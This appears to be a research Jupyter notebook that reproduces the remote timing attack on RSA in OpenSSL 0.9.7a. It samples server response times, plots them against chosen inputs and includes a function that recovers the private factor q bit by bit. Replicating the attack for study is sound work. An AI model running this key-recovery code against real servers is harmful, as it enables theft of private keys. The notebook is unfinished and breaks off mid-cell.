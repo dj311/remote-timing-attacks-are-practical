{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Remote Timing Attacks are Practical"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 151,
   "metadata": {},
   "outputs": [],
   "source": [
    "import scipy\n",
    "import scipy.signal\n",
    "import seaborn\n",
    "import sympy\n",
    "import pandas\n",
    "import os\n",
    "import matplotlib.pyplot as plt\n",
    "\n",
    "from IPython import display\n",
    "from pprint import pprint"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 152,
   "metadata": {},
   "outputs": [],
   "source": [
    "import tls\n",
    "import attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "TODO: Intro"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Theory"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Attack Setup"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 153,
   "metadata": {},
   "outputs": [],
   "source": [
    "p = sympy.Integer(11693128827090800677443535237632476895247105886644942164014088484470194179491435241190389270827811769965853291192455791684691555403909415703633832493911789)\n",
    "q = sympy.Integer(11353860437120204348539420361367294927683441924641720282978666316144621735920188475867378638813811676070362003602263559496393696538309271007870774914687283)\n",
    "N = sympy.Integer(132762152776056020551326919245624484615462467876809681535549565118332290525598572815747323476102181376625279228965473106140757139049665124368186142774966643990206422037551427526013151129106319233128471783533673959766053786798472937188481868923726256436384468384858420931063093337134977283618537887974322079287)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Exploratory Analysis\n",
    "The aim of this notebook is to sample the server response times for a bunch of `g` values, and find out if the distribution is meaningfully different between them."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 225,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>point</th>\n",
       "      <th>time</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>2106390</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>1608533</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>2145876</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>2280461</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>2116903</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22395</th>\n",
       "      <td>1256981993432118478085064843581798074451190545...</td>\n",
       "      <td>2001359</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22396</th>\n",
       "      <td>1256981993432118478085064843581798074451190545...</td>\n",
       "      <td>2094904</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22397</th>\n",
       "      <td>1256981993432118478085064843581798074451190545...</td>\n",
       "      <td>2034604</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22398</th>\n",
       "      <td>1256981993432118478085064843581798074451190545...</td>\n",
       "      <td>1994792</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22399</th>\n",
       "      <td>1256981993432118478085064843581798074451190545...</td>\n",
       "      <td>2069747</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>22400 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                   point     time\n",
       "0      6703903964971298549787012499102923063739682910...  2106390\n",
       "1      6703903964971298549787012499102923063739682910...  1608533\n",
       "2      6703903964971298549787012499102923063739682910...  2145876\n",
       "3      6703903964971298549787012499102923063739682910...  2280461\n",
       "4      6703903964971298549787012499102923063739682910...  2116903\n",
       "...                                                  ...      ...\n",
       "22395  1256981993432118478085064843581798074451190545...  2001359\n",
       "22396  1256981993432118478085064843581798074451190545...  2094904\n",
       "22397  1256981993432118478085064843581798074451190545...  2034604\n",
       "22398  1256981993432118478085064843581798074451190545...  1994792\n",
       "22399  1256981993432118478085064843581798074451190545...  2069747\n",
       "\n",
       "[22400 rows x 2 columns]"
      ]
     },
     "execution_count": 225,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "filename = \"./measurements/openssl-0.9.7a-2020-02-01-1-4-bits-400-neghibours-7-samples.txt\"\n",
    "\n",
    "if not os.path.exists(filename):\n",
    "    gs = attack.bruteforce_most_significant_bits(\n",
    "        num_bits=4,\n",
    "        neighbourhood_size=400,\n",
    "    )\n",
    "    print(\"Taking {} samples...\".format(len(gs)*7))\n",
    "    raw_samples = attack.sample(\n",
    "        gs,\n",
    "        sample_size=7, \n",
    "        u_g=True,\n",
    "        N=N,\n",
    "   )\n",
    "    samples = pandas.DataFrame.from_records(\n",
    "        raw_samples,\n",
    "        columns=[\"point\", \"time\"],\n",
    "    )\n",
    "    samples.to_csv(filename, sep=\" \")\n",
    "\n",
    "else:\n",
    "    samples = pandas.read_csv(\n",
    "        filename,\n",
    "        sep=\" \",\n",
    "        usecols=[\"point\", \"time\"],\n",
    "    )\n",
    "\n",
    "samples['point'] = samples['point'].apply(sympy.Integer)\n",
    "samples"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In the paper, they take median time for each point. By taking the minimum, I hope to extract the fastest time possible, which should be the time with minimal context switches and other delays. This works provided the only sources of unwanted noise _add time_ (rather than remove it)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 226,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>point</th>\n",
       "      <th>time</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>1608533</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>1984864</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>1993008</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>1940058</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>1897678</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3195</th>\n",
       "      <td>1256981993432118478085064843581798074451190545...</td>\n",
       "      <td>2005805</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3196</th>\n",
       "      <td>1256981993432118478085064843581798074451190545...</td>\n",
       "      <td>1985000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3197</th>\n",
       "      <td>1256981993432118478085064843581798074451190545...</td>\n",
       "      <td>1991463</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3198</th>\n",
       "      <td>1256981993432118478085064843581798074451190545...</td>\n",
       "      <td>1999757</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3199</th>\n",
       "      <td>1256981993432118478085064843581798074451190545...</td>\n",
       "      <td>1994792</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>3200 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                  point     time\n",
       "0     6703903964971298549787012499102923063739682910...  1608533\n",
       "1     6703903964971298549787012499102923063739682910...  1984864\n",
       "2     6703903964971298549787012499102923063739682910...  1993008\n",
       "3     6703903964971298549787012499102923063739682910...  1940058\n",
       "4     6703903964971298549787012499102923063739682910...  1897678\n",
       "...                                                 ...      ...\n",
       "3195  1256981993432118478085064843581798074451190545...  2005805\n",
       "3196  1256981993432118478085064843581798074451190545...  1985000\n",
       "3197  1256981993432118478085064843581798074451190545...  1991463\n",
       "3198  1256981993432118478085064843581798074451190545...  1999757\n",
       "3199  1256981993432118478085064843581798074451190545...  1994792\n",
       "\n",
       "[3200 rows x 2 columns]"
      ]
     },
     "execution_count": 226,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "samples = samples.groupby(by=\"point\").min().reset_index()\n",
    "samples"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We can group samples into their respective \"neighbourhoods\" considering their most significant bits only."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 227,
   "metadata": {},
   "outputs": [],
   "source": [
    "NUM_BITS = 12\n",
    "\n",
    "def point_to_neighbourhood(point):\n",
    "    point_int = sympy.Integer(point)\n",
    "    point_bits = attack.sympy_integer_to_bits(point_int)\n",
    "    neighbourhood_point_bits = point_bits[0:NUM_BITS] + [0] * (512-NUM_BITS)\n",
    "    neighbourhood_point_int = attack.bits_to_sympy_integer(neighbourhood_point_bits)\n",
    "    return neighbourhood_point_int\n",
    "\n",
    "samples['neighbourhood'] = samples['point'].apply(point_to_neighbourhood)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Sum together the measurements in each neighbourhood:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 228,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>neighbourhood</th>\n",
       "      <th>time</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>1.923159e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>7541891960592710868510389061490788446707143274...</td>\n",
       "      <td>1.961158e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>8379879956214123187233765623878653829674603637...</td>\n",
       "      <td>1.956948e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>9217867951835535505957142186266519212642064001...</td>\n",
       "      <td>1.969856e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>1005585594745694782468051874865438459560952436...</td>\n",
       "      <td>1.970358e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>1089384394307836014340389531104224997857698472...</td>\n",
       "      <td>1.984694e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>1173183193869977246212727187343011536154444509...</td>\n",
       "      <td>1.965919e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>1256981993432118478085064843581798074451190545...</td>\n",
       "      <td>1.940221e+06</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                       neighbourhood          time\n",
       "0  6703903964971298549787012499102923063739682910...  1.923159e+06\n",
       "1  7541891960592710868510389061490788446707143274...  1.961158e+06\n",
       "2  8379879956214123187233765623878653829674603637...  1.956948e+06\n",
       "3  9217867951835535505957142186266519212642064001...  1.969856e+06\n",
       "4  1005585594745694782468051874865438459560952436...  1.970358e+06\n",
       "5  1089384394307836014340389531104224997857698472...  1.984694e+06\n",
       "6  1173183193869977246212727187343011536154444509...  1.965919e+06\n",
       "7  1256981993432118478085064843581798074451190545...  1.940221e+06"
      ]
     },
     "execution_count": 228,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "samples = samples.groupby(by=\"neighbourhood\").mean().reset_index()\n",
    "samples"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Since we know the factors of `N` (`q` and `p` with `q<p`) we can consider each point relative in size to these factors. When plotting, we are looking for peaks and troughs near whole multples of `p` and `q`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 229,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>neighbourhood</th>\n",
       "      <th>time</th>\n",
       "      <th>point_relative_to_sqrt_n</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>1.923159e+06</td>\n",
       "      <td>0.581823</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>7541891960592710868510389061490788446707143274...</td>\n",
       "      <td>1.961158e+06</td>\n",
       "      <td>0.654551</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>8379879956214123187233765623878653829674603637...</td>\n",
       "      <td>1.956948e+06</td>\n",
       "      <td>0.727278</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>9217867951835535505957142186266519212642064001...</td>\n",
       "      <td>1.969856e+06</td>\n",
       "      <td>0.800006</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>1005585594745694782468051874865438459560952436...</td>\n",
       "      <td>1.970358e+06</td>\n",
       "      <td>0.872734</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>1089384394307836014340389531104224997857698472...</td>\n",
       "      <td>1.984694e+06</td>\n",
       "      <td>0.945462</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>1173183193869977246212727187343011536154444509...</td>\n",
       "      <td>1.965919e+06</td>\n",
       "      <td>1.018190</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>1256981993432118478085064843581798074451190545...</td>\n",
       "      <td>1.940221e+06</td>\n",
       "      <td>1.090918</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                       neighbourhood          time  \\\n",
       "0  6703903964971298549787012499102923063739682910...  1.923159e+06   \n",
       "1  7541891960592710868510389061490788446707143274...  1.961158e+06   \n",
       "2  8379879956214123187233765623878653829674603637...  1.956948e+06   \n",
       "3  9217867951835535505957142186266519212642064001...  1.969856e+06   \n",
       "4  1005585594745694782468051874865438459560952436...  1.970358e+06   \n",
       "5  1089384394307836014340389531104224997857698472...  1.984694e+06   \n",
       "6  1173183193869977246212727187343011536154444509...  1.965919e+06   \n",
       "7  1256981993432118478085064843581798074451190545...  1.940221e+06   \n",
       "\n",
       "   point_relative_to_sqrt_n  \n",
       "0                  0.581823  \n",
       "1                  0.654551  \n",
       "2                  0.727278  \n",
       "3                  0.800006  \n",
       "4                  0.872734  \n",
       "5                  0.945462  \n",
       "6                  1.018190  \n",
       "7                  1.090918  "
      ]
     },
     "execution_count": 229,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sqrt_N = sympy.sqrt(N)\n",
    "samples['point_relative_to_sqrt_n'] = samples['neighbourhood'].apply(lambda g: round(float(g/sqrt_N), 10))\n",
    "samples"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 230,
   "metadata": {},
   "outputs": [],
   "source": [
    "q_relative_to_sqrt_n = round(float(q/sqrt_N), 10)\n",
    "p_relative_to_sqrt_n = round(float(p/sqrt_N), 10)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now plot the media response time as we vary `g`:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 231,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(1923158.955, 1984693.7475, 6153.4792499999985)"
      ]
     },
     "execution_count": 231,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "smallest_time_observed = samples['time'].min()\n",
    "largest_time_observed = samples['time'].max()\n",
    "\n",
    "buffer = (largest_time_observed - smallest_time_observed)/10\n",
    "\n",
    "smallest_time_observed, largest_time_observed, buffer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 232,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<seaborn.axisgrid.FacetGrid at 0x7f72bf1223d0>"
      ]
     },
     "execution_count": 232,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1152x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "g = seaborn.relplot(data=samples, x='point_relative_to_sqrt_n', y='time', kind='line', height=8, aspect=16/8, marker=\"X\")\n",
    "g.set(ylim=(smallest_time_observed-buffer, largest_time_observed+buffer))\n",
    "g"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 233,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<seaborn.axisgrid.FacetGrid at 0x7f72c1068490>"
      ]
     },
     "execution_count": 233,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1152x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "g = seaborn.relplot(data=samples, x='point_relative_to_sqrt_n', y='time', kind='line', height=8, aspect=16/8, marker=\"X\")\n",
    "plt.plot([q_relative_to_sqrt_n, q_relative_to_sqrt_n], [smallest_time_observed*0.9, largest_time_observed*1.1], color='green')\n",
    "plt.plot([p_relative_to_sqrt_n, p_relative_to_sqrt_n], [smallest_time_observed*0.9, largest_time_observed*1.1], color='purple')\n",
    "g.set(ylim=(smallest_time_observed-buffer, largest_time_observed+buffer))\n",
    "g"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 234,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<seaborn.axisgrid.FacetGrid at 0x7f72bedeb850>"
      ]
     },
     "execution_count": 234,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1152x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "g = seaborn.relplot(data=samples, x='point_relative_to_sqrt_n', y='time', kind='line', height=8, aspect=16/8, marker=\"X\")\n",
    "plt.plot([q_relative_to_sqrt_n, q_relative_to_sqrt_n], [smallest_time_observed*0.9, largest_time_observed*1.1], color='green')\n",
    "plt.plot([p_relative_to_sqrt_n, p_relative_to_sqrt_n], [smallest_time_observed*0.9, largest_time_observed*1.1], color='purple')\n",
    "g.set(ylim=(smallest_time_observed-buffer, largest_time_observed+buffer))\n",
    "g.set(xlim=(q_relative_to_sqrt_n*0.9, p_relative_to_sqrt_n*1.1))\n",
    "g"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Bounding our search for `q`\n",
    "\n",
    "`scipy` finds two peaks in the sample set."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 235,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "2"
      ]
     },
     "execution_count": 235,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "peak_indices, _ = scipy.signal.find_peaks(samples['time'])\n",
    "len(peak_indices)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Lets re-plot the above graph with the peaks highlighted:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 251,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<seaborn.axisgrid.FacetGrid at 0x7f72bee379d0>"
      ]
     },
     "execution_count": 251,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1152x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "first_peak_index = peak_indices[0]\n",
    "first_peak = samples.iloc[first_peak_index]\n",
    "\n",
    "second_peak_index = peak_indices[1]\n",
    "second_peak = samples.iloc[second_peak_index]\n",
    "\n",
    "g = seaborn.relplot(data=samples, x='point_relative_to_sqrt_n', y='time', kind='line', height=8, aspect=16/8, marker=\"X\")\n",
    "\n",
    "plt.plot([first_peak['point_relative_to_sqrt_n'], first_peak['point_relative_to_sqrt_n']], [smallest_time_observed-buffer, largest_time_observed+buffer], color='orange')\n",
    "plt.plot([second_peak['point_relative_to_sqrt_n'], second_peak['point_relative_to_sqrt_n']], [smallest_time_observed-buffer, largest_time_observed+buffer], color='orange')\n",
    "\n",
    "g.set(ylim=(smallest_time_observed-buffer, largest_time_observed+buffer))\n",
    "g"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "I'm going to cheat a little and say that the first peak they've detected isn't quite a peak. We could have modified the `find_peaks` call to be more discerning, or fit a KDE to it, but I think its relatively clear the primary peak is the second value they've detected."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 255,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0]"
      ]
     },
     "execution_count": 255,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "attack.sympy_integer_to_bits(second_peak['neighbourhood'])[0:12]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This gives a lower bound on `q`. To get an upper bound on `q`, note the following:\n",
    "  1. $q*p = N$\n",
    "  2. $q < p$\n",
    "\n",
    "From 1. and 2. it follows that $q < \\sqrt{N}$.\n",
    "\n",
    "(Suppose $q >= \\sqrt{N}$, then by 2. $p > \\sqrt{N}$ and so $ q*p > N$ which contradicts 1. Therefore $q < \\sqrt{N}$.)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 265,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(10893843943078360143403895311042249978576984729231319619400393673023933274434756918651522867260609034998150884776519916318675029784706588081477339817443328,\n",
       " 11522245995293453226444537667133610590574234209345464522156603069988519317090416103523895551843843150180734266788088596830720220822331432054108383719953516.)"
      ]
     },
     "execution_count": 265,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "lower_bound = second_peak['neighbourhood']\n",
    "upper_bound = sqrt_N.round()\n",
    "\n",
    "lower_bound, upper_bound"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Let's plot these two bounds on the graph:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 266,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<seaborn.axisgrid.FacetGrid at 0x7f72b2c5bd90>"
      ]
     },
     "execution_count": 266,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1152x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "lower_bound_relative_to_sqrt_n = round(float(lower_bound/sqrt_N), 10)\n",
    "upper_bound_relative_to_sqrt_n = round(float(upper_bound/sqrt_N), 10)\n",
    "\n",
    "g = seaborn.relplot(data=samples, x='point_relative_to_sqrt_n', y='time', kind='line', height=8, aspect=16/8, marker=\"X\")\n",
    "\n",
    "plt.plot([lower_bound_relative_to_sqrt_n, lower_bound_relative_to_sqrt_n], [smallest_time_observed-buffer, largest_time_observed+buffer], color='orange')\n",
    "plt.plot([upper_bound_relative_to_sqrt_n, upper_bound_relative_to_sqrt_n], [smallest_time_observed-buffer, largest_time_observed+buffer], color='orange')\n",
    "\n",
    "g.set(ylim=(smallest_time_observed-buffer, largest_time_observed+buffer))\n",
    "g"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Lets consider the bit representations of these two bounds so we can set in stone the first few bits."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 267,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Lower Bound: [1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0]\n",
      "Upper Bound: [1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1]\n"
     ]
    }
   ],
   "source": [
    "print(\"Lower Bound:\", attack.sympy_integer_to_bits(lower_bound)[0:12])\n",
    "print(\"Upper Bound:\", attack.sympy_integer_to_bits(upper_bound)[0:12])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "From this we know the first 4 bits of $q$ are `[1, 1, 0, 1]`. \n",
    "\n",
    "Since it is prime, we also know that $q$ is odd, and so its least significant bit is 1. We'll ignore that for now."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# The meat of it"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 116,
   "metadata": {},
   "outputs": [],
   "source": [
    "def reverse_montegomery_transform(g, N):\n",
    "    R = sympy.Integer(2) ** 512\n",
    "    R_inverse = sympy.numbers.mod_inverse(R, N)\n",
    "    u_g = (g * R_inverse) % N\n",
    "    return u_g\n",
    "\n",
    "\n",
    "def learn_ith_bit_of_q(q_bits, i, N, sample_size=7, neighbourhood_size=400):\n",
    "    num_bits = len(q_bits)\n",
    "    \n",
    "    g_low_bits = q_bits[0:i] + [0] + [0]*(num_bits - (i+1))\n",
    "    g_low = attack.bits_to_sympy_integer(g_low_bits)\n",
    "    g_low_neighbours = [g_low + k for k in range(neighbourhood_size)]\n",
    "    u_g_low_neighbours = [reverse_montegomery_transform(neighbour, N) for neighbour in g_low_neighbours]\n",
    "        \n",
    "    g_high_bits = q_bits[0:i] + [1] + [0]*(num_bits - (i+1))\n",
    "    g_high = attack.bits_to_sympy_integer(g_high_bits)\n",
    "    g_high_neighbours = [g_high + k for k in range(neighbourhood_size)]\n",
    "    u_g_high_neighbours = [reverse_montegomery_transform(neighbour, N) for neighbour in g_high_neighbours]\n",
    "    \n",
    "    g_low_samples = attack.sample(u_g_low_neighbours, sample_size)\n",
    "    g_low_samples = pandas.DataFrame.from_records(\n",
    "        g_low_samples,\n",
    "        columns=[\"point\", \"time\"],\n",
    "    )\n",
    "    T_g_low = g_low_samples.groupby(by=\"point\").median()['time'].sum()\n",
    "    \n",
    "    g_high_samples = attack.sample(u_g_high_neighbours, sample_size)\n",
    "    g_high_samples = pandas.DataFrame.from_records(\n",
    "        g_high_samples,\n",
    "        columns=[\"point\", \"time\"],\n",
    "    )\n",
    "    T_g_high = g_high_samples.groupby(by=\"point\").median()['time'].sum()\n",
    "    \n",
    "    return T_g_low, T_g_high"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "correct_q_bits = attack.sympy_integer_to_bits(q)\n",
    "\n",
    "gaps = []\n",
    "for i in range(0, 8):\n",
    "    T_g_low, T_g_high = learn_ith_bit_of_q(correct_q_bits, i, N, neighbourhood_size=100)\n",
    "    gap = abs(T_g_low-T_g_high)\n",
    "    gaps.append(gap)\n",
    "    \n",
    "    print(i, correct_q_bits[i], T_g_low, T_g_high, gap)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
